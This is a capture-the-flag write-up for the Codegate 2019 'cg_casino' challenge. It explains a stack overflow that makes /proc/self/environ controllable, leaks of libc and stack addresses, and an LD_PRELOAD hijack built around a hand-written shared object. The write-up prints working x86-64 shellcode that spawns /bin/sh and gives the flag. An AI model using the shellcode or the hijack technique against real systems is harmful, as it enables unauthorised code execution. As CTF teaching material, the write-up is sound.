# Codegate CTF 2019 Preliminary
## cg_casino
* `CODEGATE{24cb1590e54e43b254c99404e4f86543}`
* [hook.S](https://github.com/ssspeedgit00/CTF/blob/master/2019/codegate/cg_casino/hook.S)
* [flag.py](https://github.com/ssspeedgit00/CTF/blob/master/2019/codegate/cg_casino/flag.py)
### The challege
* The files
```
.
├── Dockerfile
├── docker-compose.yml
├── libc.so.6
├── share
│   ├── cg_casino
│   └── flag_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
├── tmp
└── xinetd
```
* Menu
```
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$  CG CASINO  $$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$
1) put voucher
2) merge voucher
3) lotto
4) up down game
5) slot machine
6) exit
>
```
We can use `put voucher` to named a new file, `merge voucher` will read `0x1000` byte from the file by giving file name and write it to the new file. There are also some meaningless-seemed gambling games.
### Control the content of file
We are not able to control the content of file by opening `/dev/stdin` or `/proc/self/fd/0` due to the docker configuration. That means we need to find out some file already existed and its content is controllable.
There are some file we can think about it under `/proc/self/`: mem, stack, environ, etc.
The `/proc/self/environ` is interesting in this case, because there are `**envp` on the stack and they are point to the strings of `environ`, and there is a buffer overflow occurred by `scanf` in the `main` function of the binary.
We test whether the content of `/proc/self/environ` will changed by overwrite the `environ` on the stack, the result:
```shell
gdb-peda$ x/s 0x7ffc68771274
0x7ffc68771274:	'a' <repeats 16 times>
gdb-peda$ cat /proc/106464/environ
aaaaaaaaaaaaaaaabin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=58f0e86c0c81ERASER1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```
That's awesome!
### Information leak
There is inforamtion leak by input non numeric chracter when you play `lotto`, but only leak the address of libc at first. When you play `slot machine` first, then play `lotto`, you can leak the address of stack this time.
### Exploit
For now we are able to upload a 0x1000-byte file. We found `slot machine` will call `system("/usr/local/clear")`, So we decided to upload `hook.so` file, hook the function that will be called by `/usr/bin/clear`.
* hook.S
```nasm=
; nasm -f elf64 hook.S -o hook.o && ld --shared hook.o -o hook.so
; ubuntu 16.04 GNU ld (GNU Binutils for Ubuntu) 2.26.1
[BITS 64]
	global getenv:function
	section .text
getenv:
	mov rax, 0x68732f6e69622f
	push rax
	mov rdi, rsp
	xor esi, esi
	push 0x3b
	pop rax
	cdq
	syscall
```
There was an interesting thing, when we linked it with `ld` in ubuntu 18.04, the size of ELF came out was too big, but with the old version of `ld` in ubuntu 16.04 the size will be small enought. Awesome again!

Upload `hook.so` and overwrite `LD_PRELOAD=./hook.so` then call `slot machine` to trigger `system("/usr/local/clear")`, `getenv` will be hooked by `hook.so` and execute our shellcode.
* [flag.py](https://github.com/ssspeedgit00/CTF/blob/master/2019/codegate/cg_casino/flag.py)
### The flag: `CODEGATE{24cb1590e54e43b254c99404e4f86543}`